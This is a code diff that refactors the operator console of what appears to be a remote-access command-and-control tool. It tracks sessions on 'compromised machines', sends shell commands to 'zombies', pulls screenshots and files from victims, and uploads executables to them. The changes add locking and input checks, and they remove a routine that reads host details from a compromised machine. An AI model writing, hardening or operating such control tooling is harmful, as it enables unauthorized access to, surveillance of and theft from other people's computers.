@@ -4,53 +4,27 @@ import (
 	"bufio"
 	"fmt"
 	"log"
-	"net"
 	"os"
 	"path/filepath"
 	"strconv"
 	"strings"
 	"time"
-	_ "www.github.com/MustafaAbdulazizHamza/RingShellListener/Files"
 )
-
-func getUserInfo(conn net.Conn) (values []string, err error) {
-	radd := fmt.Sprint(conn.RemoteAddr())
-	reader := bufio.NewReader(conn)
-	conn.SetReadDeadline(time.Now().Add(time.Second * 6))
-	info, err := reader.ReadString('\n')
-	if err != nil {
-		log.Println("Unable to get the information from the compromised machine.")
-		return []string{""}, err
-	}
-	d := strings.Split(info, ".")
-
-	return []string{radd, d[0], strings.TrimSpace(d[1])}, nil
-}
 
 func listenToID(inp []string, id *string) {
 	mu.Lock()
+	defer mu.Unlock()
 
-	if len(inp) == 2 {
-		if _, exists := dt[inp[1]]; exists {
-			*id = inp[1]
+	if len(inp) != 2 {
+		log.Println("You have not entered the compromised machine's ID.")
+		return
+	}
 
-		} else {
-			log.Println("The compromised machine`s ID you entered was not found.")
-		}
+	if _, exists := dt[inp[1]]; exists {
+		*id = inp[1]
 	} else {
-		log.Println("You have not entered the compromised machine`s ID.")
+		log.Println("The compromised machine's ID you entered was not found.")
 	}
-	mu.Unlock()
-}
-func closeConnectionStuff(id string) {
-	mu.Lock()
-	if _, exists := dt[id]; exists {
-		delete(dt, id)
-	}
-	if CId == id {
-		CId = ""
-	}
-	mu.Unlock()
 }
 
 func list(inp []string) {
@@ -58,6 +32,9 @@ func list(inp []string) {
 		log.Println("You have entered an illegal list command.")
 		return
 	}
+
+	mu.RLock()
+	defer mu.RUnlock()
 
 	if inp[1] == "sessions" {
 		if len(dt) == 0 {
@@ -75,7 +52,6 @@ func list(inp []string) {
 			if out := listServers(listeningServers, "listening"); out != "" {
 				log.Println(out)
 			}
-
 		} else if inp[2] == "controlling" {
 			if out := listServers(controllingServers, "controlling"); out != "" {
 				log.Println(out)
@@ -100,8 +76,8 @@ func listServers(data map[string]string, typeOfServer string) string {
 		fmt.Printf("%-15s %-15s\n", i, v)
 	}
 	return ""
-
 }
+
 func sendCmd(cmd string, writer *bufio.Writer) (err error) {
 	if _, err := writer.WriteString(cmd + "\n"); err != nil {
 		return err
@@ -113,34 +89,54 @@ func sendCmd(cmd string, writer *bufio.Writer) (err error) {
 }
 
 func getFile(inp []string, id string) (err error) {
+	if id == "" {
+		return fmt.Errorf("no session selected")
+	}
+
+	if len(inp) < 2 {
+		return fmt.Errorf("incomplete get command")
+	}
 
 	if (inp[1] == "image" || inp[1] == "file") && len(inp) < 3 {
 		return fmt.Errorf("you must select the name of the %s", inp[1])
 	}
 
+	mu.RLock()
+	ch, exists := chs[id]
+	mu.RUnlock()
+
+	if !exists {
+		return fmt.Errorf("session not found")
+	}
+
 	switch inp[1] {
 	case "screenshots":
-		chs[id] <- fmt.Sprintf("get %s", inp[1])
+		ch <- fmt.Sprintf("get %s", inp[1])
 	case "image":
-		chs[id] <- strings.Join(inp, " ")
+		ch <- strings.Join(inp, " ")
 	case "file":
-		chs[id] <- strings.Join(inp, " ")
+		ch <- strings.Join(inp, " ")
 	default:
 		return fmt.Errorf("unsupported command was entered")
 	}
 	return nil
 }
+
 func isAValidPortNumber(value string) bool {
 	num, err := strconv.Atoi(value)
 	if err != nil {
 		return false
 	}
-	if num > 0 && num < 65535 {
+	if num > 0 && num <= 65535 {
 		return true
 	}
 	return false
 }
+
 func setValue(key, value string) (err error) {
+	mu.Lock()
+	defer mu.Unlock()
+
 	if key == "out" {
 		_, isE := os.Stat(value)
 		if os.IsNotExist(isE) {
@@ -154,27 +150,38 @@ func setValue(key, value string) (err error) {
 			return fmt.Errorf("%s is not a valid port number", value)
 		}
 	} else if key == "timeout" {
-		if d, err := strconv.Atoi(value); err == nil {
-			timeout = time.Duration(d) * time.Second
-		} else {
-			return fmt.Errorf("%d is not a valid time operand", d)
+		d, err := strconv.Atoi(value)
+		if err != nil {
+			return fmt.Errorf("%s is not a valid time operand", value)
 		}
+		timeout = time.Duration(d) * time.Second
 	} else {
 		return fmt.Errorf("%s is not a valid variable to be set", key)
 	}
 
 	return nil
 }
-func isExist(in string) (isDir bool) {
+
+func isExist(in string) bool {
 	_, err := os.Stat(in)
-	return os.IsExist(err)
+	return err == nil
 }
+
 func sendCommandToZombies(inp []string) {
+	if len(inp) < 3 {
+		log.Println("Invalid send command format.")
+		return
+	}
+
+	mu.RLock()
 	chann, open := controllingServersChannels[inp[0]]
+	mu.RUnlock()
+
 	if !open {
 		log.Println("The server you are trying to use was not found.")
 		return
 	}
+
 	if inp[1] == "command" {
 		chann <- strings.Join(inp[2:], " ")
 	} else if inp[1] == "file" {
@@ -195,27 +202,27 @@ func sendCommandToZombies(inp []string) {
 }
 
 func kill(inp []string) {
-	if (len(inp) != 2) || !((inp[0] == "listening") || (inp[0] == "controlling")) {
+	if len(inp) != 2 || (inp[0] != "listening" && inp[0] != "controlling") {
 		log.Println("You entered an illegal kill command.")
 		return
 	}
-	var chann chan string
-	var isExist bool
-	if inp[0] == "controlling" {
-		chann, isExist = controllingServersChannels[inp[1]]
-		if !isExist {
-			log.Println("The server you are requesting is unavailable.")
-			return
-		}
-	} else if inp[0] == "listening" {
-		chann, isExist = listeningServersChannels[inp[1]]
-		if !isExist {
-			log.Println("The server you are requesting is unavailable.")
-			return
-		}
-	}
-	chann <- "exit"
 
+	mu.RLock()
+	var chann chan string
+	var exists bool
+	if inp[0] == "controlling" {
+		chann, exists = controllingServersChannels[inp[1]]
+	} else if inp[0] == "listening" {
+		chann, exists = listeningServersChannels[inp[1]]
+	}
+	mu.RUnlock()
+
+	if !exists {
+		log.Println("The server you are requesting is unavailable.")
+		return
+	}
+
+	chann <- "exit"
 }
 
 func upload(inp []string, id string) {
@@ -223,18 +230,30 @@ func upload(inp []string, id string) {
 		log.Println("You have entered an illegal upload command.")
 		return
 	}
+
+	mu.RLock()
+	ch, exists := chs[id]
+	mu.RUnlock()
+
+	if !exists {
+		log.Println("Session not found.")
+		return
+	}
+
 	switch inp[1] {
 	case "file":
-		chs[id] <- strings.Join(inp, " ")
+		ch <- strings.Join(inp, " ")
 	case "executable":
-		chs[id] <- strings.Join(inp, " ")
+		ch <- strings.Join(inp, " ")
 	default:
 		log.Println("You have entered an illegal upload command.")
 	}
-
 }
 
 func FileNamesParser(commands []string) string {
+	if len(commands) < 3 {
+		return ""
+	}
 	var command strings.Builder
 	for _, c := range commands[2:] {
 		c = filepath.Base(c)
